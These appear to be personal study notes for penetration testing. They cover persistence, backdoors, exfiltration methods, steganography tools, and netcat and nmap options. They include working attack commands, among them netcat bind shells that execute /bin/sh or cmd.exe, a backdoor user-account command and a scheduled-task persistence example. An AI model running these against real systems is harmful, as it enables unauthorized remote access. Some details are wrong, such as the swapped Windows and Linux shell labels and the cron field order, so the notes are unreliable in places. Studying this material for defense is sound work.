# Detection Avoidance & Persistence

## Trojans and Backdoors

<ins> Backdoor</ins> - Gain access to a system through alternative means. 

Ex: accessing router through default admin passwords. 

<ins>RATS</ins> - Type of Malware that comes along with legit software
- Black Orrifice
- Black Shades
- Dark Comet
- Sub 7
- Netbus
- Puppy

<ins>Rootkit</ins>-  Infect system at low level using root access

## Creating Persistence
Method to maintain access for extended period of time. 
Ex: Backdoors, Root Kits, Remote Shells, Cron jobs, Registry

**APT**- Extended persistent threats for days/weeks/months/years

How To Create Persistent Access
- Add User Acouunt
On Windows: 
```c:\net user /add [username] [password]```

<ins>On Linux</ins>
**Crontabs** - Automated tasks 

    minute, second, day, month, day of week <command>

<ins>On Windows</ins> - Task Scheduler
```
- schtasks create 
- schtasks delete
- schtasks query
- schtasks run 
- schtasks change
- schtasks end

schtasks /create /sc <scheduletype> /tn <taskname> /tr <taskrun>

schtasks /create /sc hourly /mo 12 /tn hacked /tr c:\myapp.exe
```
<ins> Services & Daemons </ins>-  Waits for connections to occur. 

Linux: httpd daemon, sshd daemon
Start services on boot with ```/etc/init.d```
or ```etc/systemd```

Windows: Rededit GUI or CLI

<ins>Bindshell</ins>-  Binds to a target system to a local network port. Not popular on modern networks so a Reverse Shell is used

<ins>Reverse Shell</ins> - Setup listener on attack machine and make the target machine make the call out over the port. 

**Establish Bindhshell Using Netcat from Target** On Windows
```
nc -lp 443 -e /bin/sh
```

**Establish Bindhshell Using Netcat from Target ** On Linux
```
nc -lp 443 -e cmd.exe
```
**Now from Attacking machine**
```
nc <ip> 443
```
## Living Off the Land 
How does APT use modern malware to operate if it's filesless 

<ins>**Basic 5 Step Modern Attack Process</ins>**:

<ins>**Step 1</ins>**
- **Dropper** - how download gets on computer. Uses light weight code to download. Designed to run other types of malware on infected host. 
    - **masquerading**- when dropper replaces a genuine executable with a malicious one. 
    - **DLL Sideloading** - dropper exploit vulnerability to load a malicious program dll at runtime. 
    - **Process Hallowing** - rewrite memory locations with process code and replacingwith amlicious code. 

- **Downlaoder** - code that connects to internet to download additional tools after dropper infection. 

- **Shellcode**- any lightweight code designed to run an explot ona target. 

- **Code Injection**- Techniquethat runs malicious code with the id number of a legit process. 

<ins>**Step 2</ins>**
- **Maintain Access** - 

<ins>**Step 3</ins>**
- **Strengthen Access** - 

<ins>**Step 4</ins>**
- **Actions on Objectives** - 

<ins>**Step 5</ins>**
- **Concealment** - 

## Data Exfiltration
Methods: 
- **HTTP/HTTPS** - transfes- use commercial file sharing services to upload file to victim
- **HTTP** - Requests to DB's- copy records from database
- **DNS** - Use DNS queries to transmit data. IOC - atypical query type such as MX, TXT, CNAME, NULL. 
- **Overt Channels** -  ftp, instant messaging, email, and other file sharing tools. 
- **Explicit Tunnels** - Use of SSH or VPN to create a tunnel to transmit data. IOC- atypical endpoints due to geographic location. 

## Covert Channels 
hding inside of DNS etc. 
- Transmit data over non standard port
- Encoding data in TCP/IP packet headers
- Segmenting data into multple packets
- Obfuscating data using hex. 
- Transmitting encrypted data

## Steganography
Covering or hiding writing in an image. 

## Covering Your Tracks

- Hiding files with Linux - put a dot . in front of the file. 
-Meterpreter has a built in time stamp tool. 

- **Hide Audio** - **Steghide** is an open-source tool used to conceal a payload in either an image or audio file. The software can compress, conceal, and encrypt data.

- **Static Application Security Testing (SAST)** - is done early in the software development life cycle to examine the code for security vulnerabilities.

- **Bit-Twist** - uses packet crafting techniques as part of the attack. A more popular packet crafting tool is Scapy or hping3 which allows users to craft their own packets.

- **Meterpreter** - is a very popular payload of MetaSploit, which is an interactive, menu-based list of commands you can run on the target.

- **Snow** - is a CLI steganography tool that conceals a data payload within the whitespace of a text file that uses the ASCII format.

- **AUDIO** - **Steghide** - is an open-source tool used to conceal a payload in either an image or audio file. The software can compress, conceal, and encrypt data.

- **AUDIO** - **Coagula** is a tool used to synthesize an image into a .wav file. To achieve this, you'll need to download Coagula and Audacity, which are both free programs.

- **AUDIO** - **OpenStego** - is similar to most other tools in that you embed a message in a carrier file. To get started, youÂ‘ll need to make sure that you have the Java Runtime Environment (JRE) installed.

- **Packet Crafting** - **Yersinia** - uses packet crafting techniques as part of the attack. A more popular packet crafting tool is Scapy pr hping3 which allows users to craft their own packets.

- Proxy servers are used on a network to mediate the communications between a client and another server. One method is to use Socket Secure (SOCKS).

- **masscan** is not a tool meant for inside networks. It is extremely noisy and was designed for scanning the internet rapidly. This could actually take down a network if not careful. 

- **Packet Crafting** - **Ostinato** - uses packet crafting techniques as part of the attack. A more popular packet crafting tool is Scapy or hping3 which allows users to craft their own packets.

- **Ncat** - (not netcat)is an Interactive CLI tool written for the Nmap Project. Ncat is used to read and write raw data over a network and includes support for proxy connections along with IPv6 and SSL communications. 


### Netcat Commands

- The -u parameter starts Netcat in UDP mode. The default is to use TCP. Netcat is a command-line utility used to read from or write to a TCP or UDP network connection.

- The -l parameter starts Netcat in listen mode. The default mode is to act as a client.

- The -L parameter starts Netcat in the Windows-only "listen harder" mode. This mode creates a persistent listener that starts listening again when the client disconnects.

- The -e parameter specifies the program to execute when a connection is made.

### NMAP Commands

- **-sF** - The -sF option sends a TCP FIN to bypass a non-stateful firewall.

- **-sS** - **TCP SYN** - When using Nmap, the TCP SYN scan (-sS) is the default and most popular option. It can be performed quickly and is able to scan thousands of ports per second on a fast network not hampered by restrictive firewalls.

- **-oX** - **XML output (-oX)** - is a format that can easily be analyzed by security automation tools, converted to HTML, imported into a database, or studied using Zenmap.

- **-sX** - A Christmas tree scan sends a TCP segment with the FIN, PSH, and URG flags raised to bypass a firewall or IDS. This scan uses the option: -sX.

## Persistence and Covering Your Tracks

## Post-Exploitation Tools




 
